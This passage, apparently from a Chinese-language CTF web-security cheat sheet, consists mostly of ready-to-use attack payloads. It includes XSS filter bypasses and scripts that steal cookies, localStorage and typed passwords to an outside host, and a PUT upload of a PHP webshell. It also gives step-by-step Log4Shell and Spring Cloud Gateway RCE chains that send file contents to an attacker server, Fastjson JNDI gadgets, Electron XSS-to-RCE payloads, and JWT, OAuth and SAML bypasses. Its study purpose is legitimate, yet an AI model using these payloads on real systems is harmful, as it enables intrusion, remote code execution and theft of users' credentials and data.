<svg/onload=alert(1)>                   <!-- /代替空格 -->
<svg><animate onbegin=alert(1) attributeName=x>

===== Level 19: 无字母数字XSS =====
# 用JSFuck/AAencode等编码
<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>

===== 通用逃逸: 标签选择 =====
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>

===== 通用逃逸: payload空格替换 =====
<svg/onload=alert(1)>           # / 代替空格
<svg%0Aonload=alert(1)>         # %0A 换行
<svg%0Donload=alert(1)>         # %0D 回车
<svg%09onload=alert(1)>         # %09 Tab
```

### XSS平台利用
```javascript
// 窃取Cookie
<script>document.location='http://xss.xx/?c='+document.cookie</script>
<img src=x onerror="this.src='http://xss.xx/?c='+document.cookie">

// 窃取localStorage
<img src=x onerror="fetch('http://xss.xx/?s='+JSON.stringify(localStorage))">

// 钓鱼弹窗
<script>var p=prompt('请输入密码');new Image().src='http://xss.xx/?p='+p</script>
```

### HTTP 协议绕过
```bash
# 请求方法篡改:
curl -X PUT http://target/upload/shell.php -d '<?php system($_GET["c"]);?>'
curl -X OPTIONS http://target/  # 看支持哪些方法

# HTTP 头注入:
# 在参数中注入 \r\n 分隔的新HTTP头

# Host 头攻击:
curl -H "Host: evil.com" http://target/reset-password
```

### Server-Side Include (SSI)
```
<!--#exec cmd="cat /flag" -->
<!--#include virtual="/secret/flag" -->
.shtml 扩展名才解析
```

### Flask Debug 模式
```
// 如果 Flask debug=True
// 访问 /console → 需要PIN码
// PIN码生成 = 机器码 + 用户名 + MAC地址 的MD5
// 可通过信息收集或错误页面获取
```

---

## 新增: 现代 Web 安全速查

### CVE 热门条目 (CTF常用)
```
| 漏洞 | 影响 | 利用方式 |
|------|------|---------|
| Log4j (CVE-2021-44228) | RCE | ${jndi:ldap://evil.com/exp} |
| Spring4Shell (CVE-2022-22965) | RCE | class.module.classLoader... |
| Shiro RemberMe (CVE-2016-4437) | RCE | 反序列化 |
| Struts2 (S2-045/048) | RCE | Content-Type 构造 |
| ThinkPHP 5.x RCE | RCE | ?s=index/\think\app/invokefunction |
| Liferay Portal RCE | RCE | JSON反序列化 |
| Jackson (CVE-2017-7525) | RCE | JSON注入 |
```

---

## 完整 Web 解题流程
```
拿到URL/源码
  ↓ 信息收集
  ├── robots.txt, favicon, 响应头
  ├── 目录扫描
  ├── 参数爆破
  └── 源码审计（如果有）
  ↓
  ├── SQL → 类型判断 → payload → 注入
  │   ├── 联合查询 → 直接出数据
  │   ├── 布尔盲注 → 逐字符脚本
  │   ├── 报错注入 → extractvalue/updatexml
  │   └── 时间盲注 → sleep(5)
  │
  ├── 文件包含 → php://filter读源码
  │   └── 找到flag文件位置 → 包含
  │
  ├── 文件上传 → 绕过 → 蚁剑/webshell
  │
  ├── SSTI → 识别引擎 → 逃逸链 → RCE
  │
  ├── SSRF → 内网探测 → 读取本地文件
  │
  ├── 反序列化 → 构造payload → RCE
  │
  └── 命令注入 → 绕过过滤 → 直接执行
  ↓
  Flag
```

---

## 补充A: WebSocket 安全测试

WebSocket 是全双工长连接，常出现在实时应用中。

### 测试握手请求
```bash
# WebSocket 握手是 HTTP Upgrade
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# 如果服务器返回 101 Switching Protocols → 成功
# 否则可能有限制（Origin 检查、认证）
```

### CTF WebSocket 题型
```python
import websocket
import threading

def on_message(ws, message):
    print(f"Received: {message}")
    # 尝试注入
    if 'flag' in message.lower():
        print(f"FLAG FOUND: {message}")

def on_open(ws):
    # 发送测试消息
    ws.send('{"type":"auth","password":"admin"}')
    ws.send('{"type":"get_flag"}')
    
ws = websocket.WebSocketApp("ws://target:8080/ws",
                              on_message=on_message,
                              on_open=on_open)
ws.run_forever()
```

### WebSocket 掩码绕过
```
# WebSocket 客户端必须对 payload 做掩码 (Masking)
# 服务器可能不检查掩码（某些实现）
# 尝试发送无掩码帧 → 可能绕过过滤

# 使用 Python websocket-client 并修改源码绕过掩码检查
```

---

## 补充B: Electron 应用安全

Electron 应用本质是打包的 Chromium + Node.js，常有严重漏洞。

### Electron 架构
```
app.asar (归档文件)
  ├── main.js (主进程，有 Node.js 权限)
  ├── renderer.js (渲染进程，默认无 Node)
  └── package.json (配置)

# 关键配置
"webPreferences": {
  "nodeIntegration": true,  // 危险！渲染进程有 Node
  "contextIsolation": false,  // 危险！上下文隔离关闭
  "enableRemoteModule": true   // 危险！可以使用 remote 模块
}
```

### 常见漏洞点
```bash
# 1. 解包 asar
npm install -g asar
asar extract app.asar extracted/

# 2. 检查 XSS → RCE 链
# 如果渲染进程有 XSS，且 nodeIntegration=true:
# payload: <script>require('child_process').exec('calc')</script>

# 3. 检查自定义协议处理
# 如: myapp://evil-payload
# 可能执行任意命令

# 4. 检查 IPC 消息
# main.js 中 ipcMain.handle(...) 可能有命令注入
```

### CTF Electron 题
```javascript
// 目标：从渲染进程逃逸到主进程
// 利用 XSS + nodeIntegration

// payload 示例:
fetch('file:///flag.txt')
  .then(r => r.text())
  .then(data => fetch('http://attacker/' + btoa(data)));

// 或直接使用 Node API
const { exec } = require('child_process');
exec('cat /flag', (err, stdout) => {
  fetch('http://attacker/?flag=' + btoa(stdout));
});
```

---

## 补充C: WebAssembly (WASM) 安全

WASM 在浏览器中运行，可能有内存安全问题。

### WASM CTF 题型
```
1. 逆向 WASM 模块 → 找到 flag 比较逻辑
2. 内存泄漏 → 通过 WASM 内存读取敏感数据
3. 竞态条件 → WASM 共享内存 + 竞态
4. 类型混淆 → WASM 类型检查绕过
```

### 分析 WASM 模块
```bash
# 反编译为可读形式
wasm2wat module.wasm -o module.wat

# 或反编译为 C-like
wasm-decompile module.wasm -o module.dcmp

# 在浏览器中调试
# Chrome DevTools → Sources → WASM
# 可以设置断点、查看内存
```

### WASM 内存访问
```javascript
// WASM 线性内存可被 JavaScript 访问
const wasmMemory = new WebAssembly.Memory({ initial: 10 });

// 如果 WASM 模块导出了内存
// 可以直接读取内存中的 flag
const buffer = module.exports.memory.buffer;
const view = new Uint8Array(buffer);
let flag = '';
for (let i = 0; i < view.length; i++) {
  if (view[i] >= 32 && view[i] <= 126) {
    flag += String.fromCharCode(view[i]);
  }
}
console.log(flag);
```

---

## 补充D: 更多 CVE 实战速查

### Log4Shell (CVE-2021-44228) 完整利用
```bash
# 漏洞: JNDI 注入，Log4j2 版本 < 2.15.0
# 利用步骤:

# 1. 准备恶意 LDAP 服务器
# 使用 marshalsec
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
  "http://attacker:8000/#Exploit" 1389

# 2. 准备 Exploit.class
# Exploit.java:
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl http://attacker:8000/" + \
                java.lang.Runtime.getRuntime().exec("cat /flag").getInputStream());
        } catch (Exception e) {}
    }
}

# 3. 触发漏洞
# 在 User-Agent、X-Forwarded-For 等头中注入:
${jndi:ldap://attacker:1389/Exploit}

# 4. 如果不出网，尝试直接执行命令
# ${jndi:rmi://attacker:1099/Exploit}
```

### Spring Cloud Gateway RCE (CVE-2022-22947)
```bash
# 漏洞: SpEL 注入
# 利用步骤:

# 1. 添加恶意路由
curl -X POST http://target/actuator/gateway/routes -H "Content-Type: application/json" -d '
{
  "id": "malicious",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{T(java.lang.Runtime).getRuntime().exec(\"curl http://attacker/$(cat /flag)\")}"
    }
  }],
  "uri": "http://example.com"
}'

# 2. 刷新路由
curl -X POST http://target/actuator/gateway/refresh

# 3. 访问触发
curl http://target/malicious
```

### Fastjson 反序列化 (多个 CVE)
```bash
# 常见 payload (checkAutoType 绕过)
{"@type":"java.lang.AutoCloseable", ...}

# 利用 JNDI 注入
{"@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://attacker/Exploit",
 "autoCommit":true}

# 读文件
{"@type":"java.lang.Class",
 "val":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"}
```

---

## 补充E: Server-Sent Events (SSE) 注入

SSE 是 HTTP 长连接，服务器推送数据。

```javascript
// 客户端
const evtSource = new EventSource('/events');
evtSource.onmessage = (e) => {
  console.log(e.data);
  // 如果服务端未验证数据，可能注入恶意 JS
};

// 攻击场景:
// 1. 服务端从用户输入读取并推送
// 2. 未转义直接拼入 SSE 流
// 3. 导致 XSS

// 利用: 注入事件流格式
// data: <script>alert(1)</script>\n\n
```

---

## 更新后的解题流程（完整版）

```
HTTP 请求/连接
  ↓ 信息收集 (curl/whatweb/wappalyzer)
  ↓ 识别技术栈 (框架/语言/中间件)
  ↓
  ├── SQL 注入 → sqlmap/手工 → 数据提取
  │    ├── 联合查询 → 直接出数据
  │    ├── 布尔盲注 → 逐字符脚本
  │    ├── 报错注入 → extractvalue/updatexml
  │    └── 时间盲注 → sleep(5)
  │
  ├── 文件包含 → php://filter 读源码
  │    ├── 找到 flag 文件位置
  │    └── 包含读取
  │
  ├── 文件上传 → 绕过 (MIME/扩展名/内容)
  │    └── 蚁剑/webshell 连接
  │
  ├── SSTI → 识别引擎 (Jinja2/Twig/Freemarker)
  │    ├── 绕过过滤 → 属性访问/RCE
  │    └── 读 flag
  │
  ├── SSRF → 内网探测 (127.0.0.1/169.254.169.254)
  │    ├── 读取本地文件 (file:///flag)
  │    ├── 云元数据 (gopher/Cloud)
  │    └── Redis/内网服务攻击
  │
  ├── 反序列化 → 构造 payload (PHP/Java/Python)
  │    ├── PHP: Phar:// / unserialize
  │    ├── Java: ysoserial / JNDI
  │    └── Python: pickle / PyYAML
  │
  ├── 命令注入 → 绕过过滤 (空格/${IFS}/拼接)
  │    └── 直接执行 (cat /flag)
  │
  ├── WebSocket → 握手测试 → 消息注入
  │    └── 利用未授权访问
  │
  ├── Electron → asar 解包 → XSS → RCE
  │    └── nodeIntegration 利用
  │
  └── WASM → 反编译 → 内存读取/逆向
  ↓
  Flag = 字符串/文件内容/数据库数据

---

## Web3 / Blockchain 安全（新增V4）

### 智能合约经典漏洞
```solidity
// 1. 重入攻击 (Reentrancy) — 经典DAO攻击
contract Vulnerable {
    mapping(address => uint) balances;
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");  // 先转账!
        require(sent);
        balances[msg.sender] = 0;  // ❌ 后清零 → fallback可重入
    }
}
// 修复: 先清零再转账，或用ReentrancyGuard

// 2. 整数溢出 (Solidity < 0.8): uint8 max=255, +1=0
// 3. tx.origin钓鱼: tx.origin ≠ msg.sender 在嵌套调用中
// 4. 闪电贷攻击: 借入→操纵预言机→套利→归还 (单交易内)
```

### Web3 工具速查
```bash
# foundry cast (最常用):
cast call 0xCONTRACT "function()" --rpc-url http://target:8545
cast send 0xCONTRACT "function()" --private-key 0xKEY --rpc-url URL

# 分析工具:
slither contract.sol --print human-summary   # 静态分析
echidna contract.sol --contract TestContract  # 模糊测试
```

---

## OAuth / SAML / JWT 进阶（新增V4）

### OAuth 2.0 攻击面
```
1. redirect_uri绕过: https://target/callback@evil.com
                     https://target/callback.evil.com
2. state参数缺失 → CSRF绑定攻击者账号
3. scope升级: read → read+write
4. PKCE缺失 → 授权码拦截 (移动端)
5. implicit flow → token泄露到Referer头
```

### SAML 攻击
```xml
<!-- XML签名包装: 篡改断言但保留原始签名 -->
<!-- 注释截断: 在SAMLResponse中注入 -->
<!-- 签名验证绕过: 验证第一个断言取最后一个 -->
<!-- 工具: SAML Raider (Burp插件) -->
```

### JWT 进阶攻击
```python
import jwt
# 1. alg:HS256 + 公钥泄露 → 用公钥当HMAC密钥
token = jwt.encode({"user": "admin"}, public_key_pem, algorithm='HS256')

# 2. jku/jwk头注入 → 指向自建JWKS端点
# 3. kid路径遍历: {"kid": "../../../../../dev/null"}
# 4. kid SQL注入: {"kid": "x' UNION SELECT 'secret'--"}
# 5. 弱HMAC密钥爆破: jwt2john → hashcat/john
```"}]}
